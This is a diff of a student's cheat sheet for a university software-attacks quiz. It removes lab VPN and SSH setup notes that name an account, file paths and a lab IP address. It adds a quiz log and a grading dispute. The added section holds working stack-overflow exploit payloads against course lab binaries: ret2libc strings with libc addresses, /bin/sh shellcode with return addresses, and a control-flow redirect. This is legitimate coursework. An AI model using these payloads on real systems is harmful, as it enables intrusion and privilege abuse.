@@ -1,55 +1,7 @@
-# EPL326 Quiz 3 — Software Attacks Cheat Sheet
+# EPL326 Quiz — Software Attacks Cheat Sheet
 
-> All tools, AIs, and personal laptops are allowed. This guide covers every attack type from the course labs so you can move fast during the quiz.
-
----
-
-## ⚠️ VPN + SSH — DO THIS FIRST, EVERY SESSION
-
-**SSH to a lab machine is the first mandatory step. All exploit addresses come from the lab machine. The professor grades the addresses — WSL addresses = zero marks.**
-
-SSH is **passwordless** (key-based). VPN is **credential-based** (username + password). Assume VPN is down at the start of every session.
-
-**The specific machine number does not matter.** All ws machines share the same NFS home directory and the same libc. SSH connection is mandatory — which machine you land on is not.
-
-### Key details:
-| Item | Value |
-|------|-------|
-| VPN config | `C:\Program Files\OpenVPN\config\CSVPNv4.ovpn` |
-| VPN username | `apieri01@ucy.ac.cy` |
-| VPN credentials file | `C:\Users\andre\.ssh\vpn_creds.txt` (see one-time setup below) |
-| **Lab machines** | `103ws1`–`103ws33.in.cs.ucy.ac.cy` — **any one works** |
-| Last known working | `103ws15` = `10.16.13.53` |
-| SSH key | `C:\Users\andre\.ssh\lab_key` (passwordless — no prompt ever) |
-| Lab home dir | `/home/students/cs/2024/apieri01` (**NFS-shared across all machines**) |
-
-### One-time setup — save VPN credentials to file (do once, reuse forever):
-```powershell
-# Run in PowerShell as Administrator:
-"apieri01@ucy.ac.cy`nYOUR_PASSWORD_HERE" | Out-File -FilePath "C:\Users\andre\.ssh\vpn_creds.txt" -Encoding ascii
-```
-
-### VPN connect — ONE COMMAND (PowerShell as Administrator):
-```powershell
-Stop-Process -Name openvpn -Force -ErrorAction SilentlyContinue; Stop-Process -Name openvpn-gui -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 1; Start-Process -FilePath "C:\Program Files\OpenVPN\bin\openvpn.exe" -ArgumentList '--config "C:\Program Files\OpenVPN\config\CSVPNv4.ovpn" --auth-user-pass "C:\Users\andre\.ssh\vpn_creds.txt"' -Verb RunAs -WindowStyle Hidden
-```
-Wait ~10 seconds after running, then verify SSH.
-
-### SSH test — run after VPN connect:
-```powershell
-powershell.exe -Command "ssh -i C:\Users\andre\.ssh\lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.53 'hostname' 2>&1"
-# Must return: 103ws15.in.cs.ucy.ac.cy
-# If it hangs or times out → VPN not up yet, wait 5 more seconds and retry
-```
-
-### Full session start — copy-paste this block every time:
-```powershell
-# Kill old VPN processes and reconnect
-Stop-Process -Name openvpn -Force -ErrorAction SilentlyContinue; Stop-Process -Name openvpn-gui -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 1; Start-Process -FilePath "C:\Program Files\OpenVPN\bin\openvpn.exe" -ArgumentList '--config "C:\Program Files\OpenVPN\config\CSVPNv4.ovpn" --auth-user-pass "C:\Users\andre\.ssh\vpn_creds.txt"' -Verb RunAs -WindowStyle Hidden; Start-Sleep -Seconds 10; ssh -i C:\Users\andre\.ssh\lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.53 "hostname"
-# → 103ws15.in.cs.ucy.ac.cy  ← only proceed if you see this
-```
-
-> **VPN disconnects mid-session:** re-run the one-command VPN connect above. SSH reconnects automatically.
+> Quiz is performed **directly on the lab machines (room 103)**. No personal laptops allowed.
+> For remote access from home see [SSH_SETUP.md](SSH_SETUP.md).
 
 ---
 
@@ -1006,6 +958,55 @@ echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X ./exploit.X
 - `=== BIN 1 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
 - `=== BIN 2 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
 - `=== BIN 3 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
+
+---
+
+### 10J. 2026-G3 SET — Quiz 3 (2026-04-03) — Result: 66/100 ⚠️ MARKING DISPUTE PENDING
+
+> Quiz performed directly on lab machine. bin.2 and bin.3 confirmed working (`uid=9992`).
+> bin.1 scored 0 — professor expected `Welcome to the administrator's menu.` output.
+> Marking dispute submitted via email (2026-04-21) — awaiting response.
+
+**Classification:**
+
+| Binary | GNU_STACK | lea offset | Attack | Submitted |
+|--------|-----------|------------|--------|-----------|
+| bin.1 | RW (NX on) | `-0x32` → offset=**54** | Ret2libc (spawns shell) | ✓ works, 0 marks — wrong output expected |
+| bin.2 | RWE | `-0x3c` → offset=**60** | Shellcode | ✓ uid=9992 |
+| bin.3 | RWE | `-0x32` → offset=**50** | Shellcode | ✓ uid=9992 |
+
+**Libc addresses (lab machine, TEMP=1000):**
+```
+system()   = 0xb7dffd30
+"/bin/sh"  = 0xb7f40caa
+```
+
+**What was submitted — printf commands:**
+```bash
+# bin.1 — ret2libc (works, but professor expected welcome message)
+printf "66 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x30\xfd\xdf\xb7\xef\xbe\xad\xde\xaa\x0c\xf4\xb7" > exploit.1
+echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 ./exploit.1
+# → uid=9992(apieri01) ✓
+
+# bin.2 — shellcode
+printf "64 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xdb\xff\xbf" > exploit.2
+echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.2 ./exploit.2
+# → uid=9992(apieri01) ✓
+
+# bin.3 — shellcode
+printf "54 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAA\xda\xdb\xff\xbf" > exploit.3
+echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.3 ./exploit.3
+# → uid=9992(apieri01) ✓
+```
+
+**What the correct bin.1 answer was (control-flow redirect to display_root_menu):**
+```bash
+printf "58 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa7\x93\x04\x08" > exploit.1b
+env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 ./exploit.1b
+# → Welcome to the administrator's menu.
+```
+> `exploit.1b` was also created during the quiz session (Apr 3 18:38, 16 min after exploit.1).
+> Both files remain on lab machine with original timestamps as evidence.
 
 ---
 
